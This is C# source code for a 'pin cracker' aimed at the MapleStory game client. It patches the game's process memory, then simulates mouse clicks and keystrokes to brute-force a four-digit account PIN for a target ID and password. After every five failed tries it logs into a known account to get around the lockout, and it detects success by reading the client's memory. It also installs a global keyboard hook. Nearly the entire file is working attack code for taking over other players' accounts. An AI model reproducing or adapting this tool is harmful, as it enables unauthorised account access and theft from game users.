#region About
/*
 * .40 pin cracker for GMS
 * by gamesguru
 * if you wish to update this or make it for another
 * version of MS...you can feel free to do it! the addresses are pretty basic
 * the one is just a simple two byte memory writing and the other is just seeing which
 * dialog is open...peace!
 * this does require GGLes maple, you can find it on CEF.
 * 
 * also: many people say it's a keylogger, but all i'm doing is catching global hotkeys
 * then making it into an event...YOU HAVE THE SOURCE! YOU CAN SEE THAT IT'S NOT A
 * KEYLOGGER!
 * 
 * peace! and if you have any questions...let me know.
 * 
 * i will probably add all the extra settings and features in .41...
 * but as of now i'm working on a program like ACTool that's designed for maple...
 */
#endregion

#region TODO
/*
 * Remove messagebox which tells user to activate maple, and use setactivewindow api instead
 * i know how to do it, but i'm lazy right now
 * -
 * Add advanced settings which allow users to control all delays
 * again, it's easy but very time consuming
 * -
 * Make options to use with other clients
 * (shouldn't be TOO bad but still takes time)
 */
#endregion
 
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using WindowsApplication1.Properties;
using gma.System.Windows;

namespace WindowsApplication1
    {
    public partial class Form1 : Form
        {
        public Form1()
            {
            InitializeComponent();
            }

        #region Pin Coordinates

        //uint MainPageLoginX;
        //uint MainPageLoginY;
        //Can be replaced with {ENTER}
        uint IDX;
        uint IDY;
        uint PassWordX;
        uint PassWordY;
        uint PinChangeX;
        uint PinChangeY;
        //uint PinLoginX;
        //uint PinLoginY;
        //Can be replaced with {ENTER}
        uint PinCancelX; //also Pin Confirm Cancel
        uint PinCancelY; //"                     "
        uint GlitchProofX;
        uint GlitchProofY;

        #endregion

        #region Public declarations

        public string KnownId;
        public string KnownPass;
        public string KnownPin;
        //
        public string CrackingId;
        public string CrackingPass;
        public string CrackingStartPin;
        public string CrackingEndPin;
        //
        public int CrackingCurrentPin;
        //
        public int PinTrying;
        public string strPinTrying;
        //
        public string strProcessName;
        //
        public int timeElapsed; //used for timer later on
        //
        public bool isCracked = false;
        public bool isExtraTimeNeeded = false;
        //
        public char KnownOrCrackingChr;
        //
        MouseFunctions pMouse = new MouseFunctions();
        TrainerFunctions.AllFunctions pKernel = new TrainerFunctions.AllFunctions();
        //hotkeys
        UserActivityHook acthook;
        #endregion

        private void Form1_Load(object sender, EventArgs e)
            {
            CheckIfGenuine();
            //global hotkeys part...
            acthook = new UserActivityHook();
            acthook.KeyUp += new KeyEventHandler(acthook_KeyUp);
            //
            UpdateFrmMainSettings();
            }
        //
        private void button1_Click(object sender, EventArgs e)
            {
            button1.Enabled = false;
            button1.Enabled = false;
            button2.Enabled = false;
            textBox1.Enabled = false;
            textBox2.Enabled = false;
            textBox3.Enabled = false;
            textBox4.Enabled = false;
            textBox5.Enabled = false;
            textBox6.Enabled = false;
            textBox7.Enabled = false;
            //
            KnownId = textBox1.Text;
            KnownPass = textBox2.Text;
            KnownPin = textBox3.Text;
            CrackingId = textBox4.Text;
            CrackingPass = textBox5.Text;
            CrackingStartPin = textBox6.Text;
            CrackingEndPin = textBox7.Text;
            try
                {
                //PinTrying = Convert.ToInt16(CrackingCurrentPin //was current for some reason...
                //i changed it
                PinTrying = Convert.ToInt16(CrackingStartPin);
                }
            catch
                {
                MessageBox.Show("One or more invalid pins!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                button1.Enabled = true;
                button2.Enabled = true;
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                textBox3.Enabled = true;
                textBox4.Enabled = true;
                textBox5.Enabled = true;
                textBox6.Enabled = true;
                textBox7.Enabled = true;
                return;
                }
            //
            System.Diagnostics.Process[] myProcess = System.Diagnostics.Process.GetProcessesByName(strProcessName);
            if (myProcess.Length != 0)
                {
                pKernel.ReadProcess = myProcess[0];
                pKernel.OpenProcess();
                byte[] memory ={ 0x0f, 0x83 };
                pKernel.WriteProcessMemory((IntPtr)0x4802EA, memory);
                }
            else
                {
                MessageBox.Show("Either Maple Story isn't open or you have specified an invalid process name.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                button1.Enabled = true;
                button2.Enabled = true;
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                textBox3.Enabled = true;
                textBox4.Enabled = true;
                textBox5.Enabled = true;
                textBox6.Enabled = true;
                textBox7.Enabled = true;
                return;
                }
            if (Convert.ToInt32(CrackingStartPin) >= Convert.ToInt32(CrackingEndPin))
                {
                MessageBox.Show("Starting pin is greater than or equal to end! Make sure the staring it lower than the ending!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                button1.Enabled = true;
                button2.Enabled = true;
                textBox1.Enabled = true;
                textBox2.Enabled = true;
                textBox3.Enabled = true;
                textBox4.Enabled = true;
                textBox5.Enabled = true;
                textBox6.Enabled = true;
                textBox7.Enabled = true;
                return;
                }
            //
            MessageBox.Show("You will have 5 seconds to activate Maple once you click OK.", "Activate Maple.", MessageBoxButtons.OK, MessageBoxIcon.Information);
            Delay(5000);
            progressBar1.Maximum = Convert.ToInt32(CrackingEndPin) - Convert.ToInt32(CrackingStartPin);
            progressBar1.Maximum++;
            CrackingCurrentPin = Convert.ToInt16(CrackingStartPin);
            //
            button1.Enabled = false;
            button2.Enabled = false;
            textBox1.Enabled = false;
            textBox2.Enabled = false;
            textBox3.Enabled = false;
            textBox4.Enabled = false;
            textBox5.Enabled = false;
            textBox6.Enabled = false;
            textBox7.Enabled = false;
            timer1.Enabled = true;
            //
            KnownOrCrackingChr = 'C'; //change to K if you want to start off with the known
            UpdateSettings();
            AssignMousePos();
            StartingPinFormat();
            KnownOrCracking();
            }
        //
        private void StartingPinFormat()
            {
            if (!isCracked)
                {
                strPinTrying = PinTrying.ToString();
                if (PinTrying == 0)
                    {
                    strPinTrying = "0000";
                    }
                else if (PinTrying > 0 && PinTrying < 10)
                    {
                    strPinTrying = "000" + strPinTrying;
                    }
                else if (PinTrying >= 10 && PinTrying < 100)
                    {
                    strPinTrying = "00" + strPinTrying;
                    }
                else if (PinTrying >= 100 && PinTrying < 1000)
                    {
                    strPinTrying = "0" + strPinTrying;
                    }
                }
            }
        //
        private void KnownOrCracking()
            {
            if (!isCracked)
                {
                if (KnownOrCrackingChr == 'C')
                    {
                    CrackingLogin();
                    }
                else if (KnownOrCrackingChr == 'K')
                    {
                    KnownLogin();
                    }
                }
            }
        //
        private void CrackingLogin()
            {
            if (!isCracked) //only do this if it hasn't been cracked yet
                //you'll see this in many places...just ignore it for the most part.
                {
                ClearIdAndPass(); //clears id and pass..duh
                Delay(10);
                //pMouse.MousePos(PinCorrdinates.USER_ID_BOX_X, PinCorrdinates.USER_ID_BOX_Y);
                pMouse.MousePos(IDX, IDY);
                //moves mouse over user id box.
                Delay(250);
                pMouse.LeftClick();
                //activates user id box
                Delay(150);
                SendKeys.SendWait(CrackingId);
                //enters cracking id into user id box
                Delay(10);
                //
                //pMouse.MousePos(PinCorrdinates.PASSWORD_BOX_X, PinCorrdinates.PASSWORD_BOX_Y);
                pMouse.MousePos(PassWordX, PassWordY);
                //moves mouse over pass box
                Delay(250);
                pMouse.LeftClick();
                //activates pass box
                Delay(150);
                //enters cracking pass into password box
                SendKeys.SendWait(CrackingPass);
                //
                Delay(20);
                SendKeys.SendWait("{ENTER}");
                //presses enter, opening pin menu
                //
                //these are needed
                bool DelayAready = false;
                isExtraTimeNeeded = false;
                //
                //begin typing pin sequence
                for (int i = 0; i < 5; i++)
                    {
                    if (!DelayAready)
                        {
                        CheckIfPinMenuOpen();
                        //pin menu is now active
                        Delay(10);
                        DelayAready = true;
                        }
                    //this is where the pin is sent and enter is pressed
                    //
                    SendKeys.SendWait(strPinTrying);
                    SendKeys.SendWait("{ENTER}");
                    //this is needed for telling the lazy user what number they are on
                    //and what-not
                    //
                    progressBar1.Value++;
                    label1.Text = strPinTrying;
                    label15.Text = progressBar1.Value.ToString();
                    double MaxMinusOne = Convert.ToDouble(progressBar1.Maximum);
                    MaxMinusOne -= 1;
                    Single PercentDone = Convert.ToSingle(progressBar1.Value / MaxMinusOne);
                    PercentDone *= 100;
                    label17.Text = PercentDone.ToString();
                    try
                        {
                        label17.Text = label17.Text.Remove(4);
                        }
                    catch { }
                    label17.Text += "%";
                    //
                    //
                    if (i != 4)
                        {
                        Delay(1); //delays because you need to at this point...don't ask
                        CheckIfPinMenuOpen();
                        Delay(1); //again
                        }
                    else
                        {
                        Delay(10); //extra delay is needed here
                        CheckIfPinMenuOpen();
                        Delay(20); //again...
                        }
                    CheckIfCracked(); //this method preforms a check to see if the account
                    SaveCurrentPin();
                    //has beeen sucessfully cracked.
                    Delay(1); //this is needed, because some people lag...
                    //
                    if (strPinTrying == CrackingEndPin)
                        {
                        FinishedButNotCracked(); //since the current pin and ending pin
                        //are the same...and it's not cracked, go to this method...
                        }
                    //
                    if (!isCracked)
                        {
                        IncreasePinTrying();
                        StartingPinFormat();
                        }
                    else
                        {
                        //pin is cracked
                        break; //cancels the current loop
                        }
                    }
                //end for loop
                //
                //return to main menu
                if (!isCracked)
                    {
                    Delay(10);
                    //pMouse.MousePos(473, 367); //move over cancel pin
                    pMouse.MousePos(PinCancelX, PinCancelY);
                    pMouse.LeftClick();
                    SendKeys.SendWait("{ESCAPE}");
                    SendKeys.SendWait("{ESCAPE}");//double try.
                    //many ppl report problems here...
                    Delay(1);
                    KnownOrCrackingChr = 'K';
                    KnownOrCracking();
                    }
                }
            }
        //
        private void KnownLogin()
            {
            if (!isCracked)
                {
                ClearIdAndPass(); //clears id and pass
                Delay(10);
                //pMouse.MousePos(PinCorrdinates.USER_ID_BOX_X, PinCorrdinates.USER_ID_BOX_Y);
                pMouse.MousePos(IDX, IDY);
                Delay(250);
                pMouse.LeftClick();
                Delay(150);
                SendKeys.SendWait(KnownId);
                //you know what all this does...
                //
                //pMouse.MousePos(PinCorrdinates.PASSWORD_BOX_X, PinCorrdinates.PASSWORD_BOX_Y);
                pMouse.MousePos(PassWordX, PassWordY);
                Delay(250);
                pMouse.LeftClick();
                Delay(150);
                SendKeys.SendWait(KnownPass);
                Delay(150);
                SendKeys.SendWait("{ENTER}");
                Delay(150);
                /*
                pMouse.MousePos(PinCorrdinates.MAIN_PAGE_LOGIN_X, PinCorrdinates.MAIN_PAGE_LOGIN_Y);
                Delay(10);
                pMouse.LeftClick();
                Delay(1);
                pMouse.LeftClick();
                */
                //
                //Delay(2500); //pin menu is active now
                //made a better method!
                Delay(10);
                isExtraTimeNeeded = true; //this is needed. don't ask questions
                CheckIfPinMenuOpen(); //checks if the pin menu is open
                Delay(10);
                SendKeys.SendWait(KnownPin); //sends known pin
                Delay(10);
                //pMouse.MousePos(304, 362); //change pin on pin menu
                pMouse.MousePos(PinChangeX, PinChangeY);
                Delay(10);
                pMouse.LeftClick(); //clicks change pin
                Delay(10);
                //
                //
                //Delay(2000); //change pin menu is now active
                //last, and biggest delay that i ommitted.
                //
                Delay(500);
                isExtraTimeNeeded = true;
                CheckIfPinMenuOpen();
                Delay(10);
                //pMouse.MousePos(459, 363); //move over cancel pin
                //pMouse.MousePos(466, 338);
                pMouse.MousePos(PinCancelX, PinCancelY);
                //Delay(50);
                pMouse.LeftClick(); //cancel pin
                Delay(10);
                //
                CheckIfConfirmPinCancelIsOpen();
                Delay(100); //confirm cancel menu is now active
                //pMouse.MousePos(798, 624); //needed or it glitches
                pMouse.MousePos(GlitchProofX, GlitchProofY);
                //pMouse.LeftClick();
                Delay(10);
                //pMouse.MousePos(459, 363); //move over confirm cancel pin
                pMouse.MousePos(PinCancelX, PinCancelY);
                //Delay(150);
                //SendKeys.SendWait("{ENTER}");
                Delay(10);
                pMouse.LeftClick();
                //Delay(200);
                /*
                pMouse.LeftClick();
                Delay(100);
                pMouse.LeftClick();
                Delay(50);
                pMouse.LeftClick();
                Delay(10);
                pMouse.LeftClick();
                pMouse.LeftClick();
                pMouse.LeftClick();*/
                //
                //Delay(400);
                //Delay(10);
                KnownOrCrackingChr = 'C';
                KnownOrCracking();
                }
            }
        //
        private void ClearIdAndPass()
            {
            if (!isCracked)
                {
                Delay(10);
                /*
                //quick check ppl reported bugs here
                //
                //SendKeys.SendWait("{ESCAPE}");
                //Delay(10);
                //SendKeys.SendWait("{ESCAPE}"); //these are ommitted because they
                //Delay(20); //counteract the cancel pin change
                */
                //pMouse.MousePos(459, 364); //just a check that clicks confirm cancel if it's still open
                pMouse.MousePos(PinCancelX, PinCancelY);
                Delay(10);
                pMouse.LeftClick();
                //Delay(20);
                pMouse.LeftClick();
                Delay(20);
                
                //
                //username
                //pMouse.MousePos(PinCorrdinates.USER_ID_BOX_X, PinCorrdinates.USER_ID_BOX_Y);
                pMouse.MousePos(IDX, IDY);
                Delay(40);
                pMouse.LeftClick();
                Delay(40);
                for (int i = 0; i < 55; i++)
                    {
                    SendKeys.SendWait("{BACKSPACE}");
                    }
                //password
                //pMouse.MousePos(PinCorrdinates.PASSWORD_BOX_X, PinCorrdinates.PASSWORD_BOX_Y);
                pMouse.MousePos(PassWordX, PassWordY);
                Delay(40);
                pMouse.LeftClick();
                Delay(40);
                for (int i = 0; i < 55; i++)
                    {
                    SendKeys.SendWait("{BACKSPACE}");
                    }
                /*
                //double check
                //user id
                Delay(50);
                pMouse.MousePos(PinCorrdinates.USER_ID_BOX_X, PinCorrdinates.USER_ID_BOX_Y);
                pMouse.LeftClick();
                Delay(20);
                for (int i = 0; i < 25; i++)
                    {
                    SendKeys.SendWait("{BACKSPACE}");
                    }
                //
                //password
                pMouse.MousePos(PinCorrdinates.PASSWORD_BOX_X, PinCorrdinates.PASSWORD_BOX_Y);
                Delay(100);
                pMouse.LeftClick();
                Delay(20);
                for (int i = 0; i < 25; i++)
                    {
                    SendKeys.SendWait("{BACKSPACE}");
                    }
                Delay(100);*/
                }
            }
        //
        private void IncreasePinTrying()
            {
            if (!isCracked)
                {
                PinTrying++;
                StartingPinFormat();
                }
            }
        //
        private void CheckIfCracked()
            {
            if (!isCracked)
                {
                System.Diagnostics.Process[] myProcess = System.Diagnostics.Process.GetProcessesByName(strProcessName);
                if (myProcess.Length != 0)
                    {
                    pKernel.ReadProcess = myProcess[0];
                    pKernel.OpenProcess();
                    byte[] memory;
                    //memory = pKernel.ReadProcessMemory((IntPtr)0x7dbefd, 4); //version .39
                    memory = pKernel.ReadProcessMemory((IntPtr)0x7e9080, 4); //version .40
                    int value = BitConverter.ToInt32(memory, 0);
                    if (value != 0)
                        {
                        isCracked = true;
                        Cracked();
                        }
                    }
                }
            }
        //
        private void CheckIfPinMenuOpen()
            {
            if (!isCracked)
                {
                System.Diagnostics.Process[] myProcess = System.Diagnostics.Process.GetProcessesByName(strProcessName);
                if (myProcess.Length != 0)
                    {
                    pKernel.ReadProcess = myProcess[0];
                    pKernel.OpenProcess();
                    byte[] memory = pKernel.ReadProcessMemory((IntPtr)0x7EB038, 4);
                    int value = BitConverter.ToInt32(memory, 0);
                    if (isExtraTimeNeeded)
                        {
                        Delay(50);
                        }
                    if (value == 4) //pin box is open
                        {

                        }
                    else //maple is fully loaded but box is not open
                        {
                        CheckIfPinMenuOpen();
                        }

                    }
                }
            }
        //
        private void CheckIfChangePinIsOpen()
            {

            }
        //
        private void CheckIfConfirmPinCancelIsOpen()
            {
            if (!isCracked)
                {
                string strProcName = Settings.Default.strProcessName;
                System.Diagnostics.Process[] myProcess = System.Diagnostics.Process.GetProcessesByName(strProcessName);
                if (myProcess.Length != 0)
                    {
                    pKernel.ReadProcess = myProcess[0];
                    pKernel.OpenProcess();
                    byte[] memory = pKernel.ReadProcessMemory((IntPtr)0x7EB038, 4);
                    int value = BitConverter.ToInt32(memory, 0);
                    if (value == 5) //confirm cancel dialog is open
                        {
                        Delay(10);
                        }
                    else  //maple is fully loaded but box is not open
                        {
                        Delay(10);
                        CheckIfConfirmPinCancelIsOpen();
                        }
                    }
                Delay(1);
                }
            }
        //
        private void Cracked()
            {
            if (Settings.Default.CloseOrNot)
                {
                System.Diagnostics.Process[] myProcess = System.Diagnostics.Process.GetProcessesByName(strProcessName);
                for (int i = 0; i < myProcess.Length; i++)
                    {
                    myProcess[i].Kill();
                    }
                }
            System.IO.File.WriteAllText("Correct Pin.txt", strPinTrying);
            label1.Text = strPinTrying;
            //label10.Visible = true;
            label13.Text = "Correct pin:";
            timer1.Enabled = false;
            progressBar1.Value = progressBar1.Maximum;
            MessageBox.Show("The crack was sucessful! Check the file 'Correct Pin.txt' for the details, but if you don't want to wait, the pin is: " + strPinTrying + ".", "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        //
        private void FinishedButNotCracked()
            {
            if (!isCracked)
                {
                MessageBox.Show("The pins :" + CrackingStartPin + " to: " + CrackingEndPin + " have been tested, but none worked. Perhaps an error or your internet connection, keep in mind that this is beta!", "Finished but not successful!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
            }
        //
        private void CheckIfGenuine()
            {
            string aPath1 = Application.ExecutablePath;
            if (!aPath1.EndsWith("Pin Cracker 1.05.exe"))
                {
                MessageBox.Show("Be certain that the exe name is 'Pin Cracker 1.05.exe' (no quotes) and try again!","Error: invalid .exe name!",MessageBoxButtons.OK,MessageBoxIcon.Error);
                Application.ExitThread();
                }
            }
        //
        private void Delay(int delayInMilliseconds)
            {
            //i wrote this up to delay while the application still processes
            TimeSpan timespants;
            DateTime datetimedt = DateTime.Now.AddMilliseconds(delayInMilliseconds);
            do
                {
                timespants = datetimedt.Subtract(DateTime.Now);
                Application.DoEvents(); // keep app responsive
                System.Threading.Thread.Sleep(1); // Reduce CPU usage (keep interval SMALL)
                }
            while (timespants.TotalMilliseconds > 0);
            }
        //
        private void SaveCurrentPin()
            {
            //i added this as a beta only feature...because it's unstable and sometimes
            //you have to close the app, without saving and if you weren't there for
            //a while it would suck...
            System.IO.File.WriteAllText("Last Pin Trying Backup.txt", "The last pin about to be tried was: " + strPinTrying + ". So do one less than that!");
            }
        //
        private void UpdateSettings()
            {
            Settings.Default.crackingEndPin = textBox7.Text;
            Settings.Default.crackingId = textBox4.Text;
            Settings.Default.crackingPass = textBox5.Text;
            Settings.Default.crackingStartPin = textBox6.Text;
            Settings.Default.knownId = textBox1.Text;
            Settings.Default.knownPass = textBox2.Text;
            Settings.Default.knownPin = textBox3.Text;
            Settings.Default.Save();
            }
        //
        private void UpdateFrmMainSettings()
            {
            textBox1.Text = Settings.Default.knownId;
            textBox2.Text = Settings.Default.knownPass;
            textBox3.Text = Settings.Default.knownPin;
            textBox4.Text = Settings.Default.crackingId;
            textBox5.Text = Settings.Default.crackingPass;
            textBox6.Text = Settings.Default.crackingStartPin;
            textBox7.Text = Settings.Default.crackingEndPin;
            //
            if (Settings.Default.CensoredPass)
                {
                textBox2.PasswordChar = '*';
                textBox5.PasswordChar = '*';
                }
            else
                {
                textBox2.PasswordChar = textBox1.PasswordChar;
                textBox5.PasswordChar = textBox1.PasswordChar;
                }
            if (Settings.Default.CensoredPins)
                {
                textBox3.PasswordChar = '*';
                textBox6.PasswordChar = '*';
                textBox7.PasswordChar = '*';
                }
            else
                {
                textBox3.PasswordChar = textBox1.PasswordChar;
                textBox6.PasswordChar = textBox1.PasswordChar;
                textBox7.PasswordChar = textBox1.PasswordChar;
                }
            strProcessName = Settings.Default.strProcessName;
            if (Settings.Default.strProcessName.EndsWith(".exe"))
                {
                strProcessName = strProcessName.Replace(".exe", "");
                }
            }
        //
        private void AssignMousePos()
            {
            if (Settings.Default.Windowed)
                {
                //MainPageLoginX = 642;
                //MainPageLoginY = 281;
                //
                IDX = 566;
                IDY = 274;
                //
                PassWordX = 566;
                PassWordY = 300;
                //
                PinChangeX = 304;
                PinChangeY = 362;
                //
                PinCancelX = 473;
                PinCancelY = 367;
                //
                GlitchProofX = 798;
                GlitchProofY = 624;
                }
            else //Settings.Default.Windowed is false
                {
                //MainPageLoginX = 640;
                //MainPageLoginY = 260;
                //
                IDX = 550;
                IDY = 249;
                //
                PassWordX = 550;
                PassWordY = 276;
                //
                PinChangeX = 306;
                PinChangeY = 337;
                //
                PinCancelX = 466;
                PinCancelY = 338;
                //
                GlitchProofX = 999;
                GlitchProofY = 999;
                }
            }
        //
        private void button2_Click(object sender, EventArgs e)
            {
            frmSettings SettingsForm = new frmSettings();
            SettingsForm.ShowDialog();
            AssignMousePos();
            UpdateFrmMainSettings();
            }
        //
        private void button3_Click(object sender, EventArgs e)
            {
            MessageBox.Show("Coded by gamesguru, not meant to be released, yet. Beta tested by N U C L E A R.", "About");
            }
        //
        private void button4_Click(object sender, EventArgs e)
            {
            DialogResult dRT = MessageBox.Show("Do you wish to close?", "Close", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
            if (dRT == DialogResult.Yes)
                {
                System.IO.File.WriteAllText("Last Tried Pin.txt", "The last pin that was tried was: " + strPinTrying + " but use one less than that. And if you have any questions/comments/find a bug...let me know.");
                isCracked = true;
                System.Diagnostics.Process[] myApp = System.Diagnostics.Process.GetProcessesByName("Pin Cracker 1.05");
                for (int i = 0; i < myApp.Length; i++)
                    {
                    myApp[i].Kill();
                    }
                }
            }
        //
        private void button5_Click(object sender, EventArgs e)
            {
            MessageBox.Show("Will add later...peace~");
            }
        //
        private void timer1_Tick(object sender, EventArgs e)
            {
            timeElapsed++;
            label12.Text = timeElapsed.ToString() + " seconds";
            }
        //
        private void acthook_KeyUp(object sender, KeyEventArgs e)
            {
            //these are the global hotkeys
            if (e.KeyValue == 0x78) //f9
                {
                System.Threading.Thread.CurrentThread.Suspend();
                }
            else if (e.KeyValue == 0x79) //f10
                {
                System.IO.File.WriteAllText("Last Tried Pin.txt", "The last pin that was about to be tried was: " + strPinTrying + " so use one less than that. And if you have any questions/comments/find a bug...let me know.");
                isCracked = true;
                System.Diagnostics.Process[] myApp = System.Diagnostics.Process.GetProcessesByName("Pin Cracker 1.05");
                for (int i = 0; i < myApp.Length; i++)
                    {
                    myApp[i].Kill();
                    }
                }
            else if (e.KeyValue == 0x7a) //f11
                {
                System.Diagnostics.Process[] myProcess = System.Diagnostics.Process.GetProcessesByName(strProcessName);
                if (myProcess.Length == 0)
                    {
                    string MaplePath = Settings.Default.Directory;
                    if (MaplePath.Contains(Settings.Default.strProcessName))
                        {
                        MaplePath = MaplePath.Replace(Settings.Default.strProcessName, "");
                        }
                    if (MaplePath.EndsWith(".exe"))
                        {
                        MaplePath.Replace(".exe", "");
                        }
                    MaplePath = MaplePath + "\\";
                    MaplePath = MaplePath + Settings.Default.strProcessName;
                    MaplePath = MaplePath + ".exe";
                    try
                        {
                        System.Diagnostics.Process.Start(MaplePath);
                        }
                    catch
                        {
                        MessageBox.Show("'" + Settings.Default.Directory + "'" + " does not contain: " + Settings.Default.strProcessName + ".exe", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                        }
                    }
                }
            else if (e.KeyValue  == 0x7b) //f12
                {
                System.Diagnostics.Process[] myProcess = System.Diagnostics.Process.GetProcessesByName(strProcessName);
                for (int i = 0; i < myProcess.Length; i++)
                    {
                    myProcess[i].Kill();
                    }
                }
            }
        //
        //i added these because of the retards who wouldn't bother
        //typing out the whole pin...
        private void textBox3_Leave(object sender, EventArgs e)
            {
            try
                {
                int Value = Convert.ToInt32(textBox3.Text);
                if (textBox3.Text.Length != 4)
                    {
                    if (Value == 0)
                        {
                        textBox3.Text = "0000";
                        }
                    else if (Value > 0 && Value < 10)
                        {
                        textBox3.Text = "000" + textBox3.Text;
                        }
                    else if (Value >= 10 && Value < 100)
                        {
                        textBox3.Text = "00" + textBox3.Text;
                        }
                    else if (Value >= 100 && Value < 1000)
                        {
                        textBox3.Text = "0" + textBox3.Text;
                        }
                    }
                }
            catch
                {
                MessageBox.Show("Invalid value in text box!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        //
        private void textBox6_Leave(object sender, EventArgs e)
            {
            try
                {
                int Value = Convert.ToInt32(textBox6.Text);
                if (textBox6.Text.Length != 4)
                    {
                    if (Value == 0)
                        {
                        textBox6.Text = "0000";
                        }
                    else if (Value > 0 && Value < 10)
                        {
                        textBox6.Text = "000" + textBox6.Text;
                        }
                    else if (Value >= 10 && Value < 100)
                        {
                        textBox6.Text = "00" + textBox6.Text;
                        }
                    else if (Value >= 100 && Value < 1000)
                        {
                        textBox6.Text = "0" + textBox6.Text;
                        }
                    }
                }
            catch
                {
                MessageBox.Show("Invalid value in text box!","ERROR",MessageBoxButtons.OK,MessageBoxIcon.Error);
                }
            }
        //
        private void textBox7_Leave(object sender, EventArgs e)
            {
            try
                {
                int Value = Convert.ToInt32(textBox7.Text);
                if (textBox7.Text.Length != 4)
                    {
                    if (Value == 0)
                        {
                        textBox7.Text = "0000";
                        }
                    else if (Value > 0 && Value < 10)
                        {
                        textBox7.Text = "000" + textBox7.Text;
                        }
                    else if (Value >= 10 && Value < 100)
                        {
                        textBox7.Text = "00" + textBox7.Text;
                        }
                    else if (Value >= 100 && Value < 1000)
                        {
                        textBox7.Text = "0" + textBox7.Text;
                        }
                    }
                }
            catch
                {
                MessageBox.Show("Invalid value in text box!", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

        private void button3_Click_1(object sender, EventArgs e)
            {
            frmHelp HelpForm = new frmHelp();
            HelpForm.ShowDialog();
            }
        }
    }

#region All Omitted
#region omitted
/*
                        string strProcName = Settings.Default.strProcessName;
                        if (strProcName.EndsWith(".exe"))
                            {
                            strProcName = strProcName.Replace(".exe", "");
                            }
                        System.Diagnostics.Process[] myProcess = System.Diagnostics.Process.GetProcessesByName(strProcName);
                        if (myProcess.Length != 0)
                            {
                            pKernel.ReadProcess = myProcess[0];
                            pKernel.OpenProcess();
                            byte[] memory = pKernel.ReadProcessMemory((IntPtr), 4);
                            int value = BitConverter.ToInt32(memory, 0);
                            Return:
                            if (value != 4) //not pin menu
                                {
                                goto Return; //stfu
                                }
                            else
                                {
                                
                                }
                            //ahahdsflahsdfladshf
                            }*/
#endregion

#region omitted
//Delay(2500); //pin menu is now active
//made better method
#endregion

#region omitted
/*
pMouse.MousePos(PinCorrdinates.MAIN_PAGE_LOGIN_X, PinCorrdinates.MAIN_PAGE_LOGIN_Y);
Delay(10);
pMouse.LeftClick();
pMouse.LeftClick();
*/
#endregion

#region omitted
/*
        private void ReturnToMainFromKnownLogin()
            {
            pMouse.MousePos(PinCorrdinates.BACK_X, PinCorrdinates.BACK_Y);
            pMouse.LeftClick();
            Delay(100);
            SendKeys.SendWait("{ENTER}");
            Delay(1500);
            }
        */
#endregion

#region omitted
/*private void ReturnFromIncorrectPin()
            {
            SendKeys.SendWait("{ESCAPE}");
            }
        //*/
#endregion

#region omitted, fixed this problem
/*
        private void SubtractOneFromFinal()
            {
            string strPinTrying1 = strPinTrying.Substring(0, 1);
            string strPinTrying2 = strPinTrying.Substring(1, 1);
            string strPinTrying3 = strPinTrying.Substring(2, 1);
            string strPinTrying4 = strPinTrying.Substring(3, 1);
            oneSubtractedFrom = strPinTrying1 + strPinTrying2 + strPinTrying3 + strPinTrying4;
            int PinTrying = Convert.ToInt32(oneSubtractedFrom);
            PinTrying--;
            oneSubtractedFrom = PinTrying.ToString();
            if (PinTrying == 0)
                {
                oneSubtractedFrom = "0000";
                }
            else if (PinTrying > 0 && PinTrying < 10)
                {
                oneSubtractedFrom = "000" + oneSubtractedFrom;
                }
            else if (PinTrying >= 10 && PinTrying < 100)
                {
                oneSubtractedFrom = "00" + oneSubtractedFrom;
                }
            else if (PinTrying >= 100 && PinTrying < 1000)
                {
                oneSubtractedFrom = "0" + oneSubtractedFrom;
                }
            }
         */
#endregion

#region omitted, changed this plan
/*
                pMouse.MousePos(715, 583);
                Delay(10);
                pMouse.LeftClick();
                Delay(1);
                //mardia
                pMouse.MousePos(252, 191);
                Delay(1);
                pMouse.LeftClick();
                Delay(1);
                //one more for good measure
                //scania
                pMouse.MousePos(356, 182);
                Delay(1);
                pMouse.LeftClick();
                //resume and go back to main menu.
                Delay(5);
                pMouse.MousePos(PinCorrdinates.BACK_X, PinCorrdinates.BACK_Y);
                Delay(1);
                pMouse.LeftClick();
                Delay(100);
                SendKeys.SendWait("{ENTER}");
                Delay(20);
                SendKeys.SendWait("{ENTER}");//double
                Delay(4000);
                */
#endregion
#endregion